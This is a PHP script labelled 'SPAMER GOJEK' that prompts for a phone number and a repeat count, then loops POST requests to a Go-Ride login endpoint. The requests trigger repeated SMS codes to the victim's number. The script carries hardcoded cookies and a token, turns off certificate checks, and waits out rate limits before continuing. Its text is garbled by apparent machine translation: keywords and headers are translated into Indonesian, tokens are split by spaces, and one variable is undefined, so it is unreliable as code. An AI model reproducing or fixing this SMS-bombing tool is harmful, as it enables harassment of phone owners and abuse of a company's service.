<? php
/ * 
SPAMER GOJEK
Mr.J49UN9_404
Terimakasih Semua
* /
$ green   =  " \ e [92m " ;
$ red     =  " \ e [91m " ;
$ yellow  =  " \ e [93m " ;
$ blue    =  " \ e [36m " ;
sistem ( " jelas " );
tidur ( 2 );
echo  " $ green + --------------- [# GO! - JEK - SPAM SMS #] --------------- + \ n " ;
tidur ( 2 );
echo  " $ green + ------------------- [# Mr.J49UN9_404 #] --------------- ---- + \ n " ;
echo  " \ n NO HP: " ;
$ no  =  trim ( fgets ( STDIN , 1024 ));
echo  " \ n COUNT: " ;
$ loop  =  trim ( fgets ( STDIN , 1024 ));
echo  " \ n $ blue + --------------------- [# RESULT #] ----------------- ---- + \ n " ;
$ no  =  substr ( trim ( $ no ), 1 );
untuk ( $ x = 1 ; $ x <= $ loop ; $ x ++ ) {
	$ c  =  curl_init ();
	curl_setopt ( $ c , CURLOPT_URL , " https://daftar.go-ride.co.id/supply/app/goride/v1/login " );
	curl_setopt ( $ c , CURLOPT_SSL_VERIFYHOST , 0 );
	curl_setopt ( $ c , CURLOPT_SSL_VERIFYPEER , 0 );
	curl_setopt ( $ c , CURLOPT_RETURNTRANSFER , 1 );
	curl_setopt ( $ c , CURLOPT_HTTPHEADER , array (
		' Cookie: _ga = GA1.3.293141030.1524368226; _gid = GA1.3.656788143.1524368226; _gat = 1; _gat_gtag_UA_69417218_24 = 1; _onboarding_session = --53f31531a2d3e955c9a1e48c92d6e0b74ec75412 ' ,
	    ' Permintaan Tingkatkan-Aman: 1 ' ,
	    ' Asal: https://daftar.go-ride.co.id ' ,
	    ' Accept-Encoding: gzip, deflate, br ' ,
	    ' Accept-Language: en-US, en; q = 0,9 ' ,
	    ' Terima: teks / html, aplikasi / xhtml + xml, aplikasi / xml; q = 0.9, gambar / webp, gambar / apng, * / *; q = 0.8 ' ,
	    ' Agen-Pengguna: Mozilla / 5.0 (X11; Linux x86_64) AppleWebKit / 537.36 (KHTML, seperti Gecko) Chrome / 62.0.3202.62 Safari / 537.36 ' ,
	    ' Content-Type: application / x-www-form-urlencoded ' ,
	    ' Referer: https://daftar.go-ride.co.id/supply/app/goride/v1/login/new ' ,
	    ' Koneksi: tetap hidup '
	));
	curl_setopt ( $ c , CURLOPT_POSTFIELDS , " utf8 =% E2% 9C% 93 & authenticity_token = hhfItbVeAjcLn% 2BYCCJcY50D3CTiueFJaJg1Vwr3im4o% 2ByH4DGDW2hnvFfJ8grQ6DlqBqnzG1Xwuk% 2BIX2h8uajw% 3D% 3D & contact_no = " . $ no );
	curl_setopt ( $ c , CURLOPT_POST , 1 );
	$ hasil  =  curl_exec ( $ c );
	// FUNGSI FALSE
	if ( $ hasil  ==  " Too Many Requests " ) {
		$ loop  + =  1 ;
		echo  " \ e [91m $ x . Kode gagal mengirim :( \ n \ e [97mCount +1 \ n " . ( $ loop - $ x ) . " tersisa \ n \ e [93mSleep in 60s \ n " ;
		flush ();
		tidur ( 60 );		
	} else {
		echo  " $ red    $ x . NO HP: [0 $ no ] [STATUS: SUCCESS]     \ n " ;
		flush ();
		tidur ( 12 );		
	}
}
echo  " $ cyan + --------------------------------------------- --------- + \ n " ;
echo  " $ green | [#] Mr.J49UN9_404 [#] | \ n " ;
echo  " $ cyan + --------------------------------------------- --------- + \ n " ;
? >
